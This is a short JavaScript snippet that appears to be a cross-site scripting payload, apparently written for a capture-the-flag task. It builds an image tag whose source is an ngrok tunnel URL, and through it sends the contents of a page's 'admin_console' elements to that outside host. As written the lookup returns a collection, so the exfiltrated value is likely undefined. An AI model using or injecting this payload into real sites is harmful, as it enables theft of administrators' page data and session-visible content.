function addTheImage() {
    var img = document.createElement('img');
    img.src = "http://3e6850f2.ngrok.io?c="+document.getElementsByClassName("col-8 admin_console").innerHTML;
    document.body.appendChild(img);
}
addTheImage();
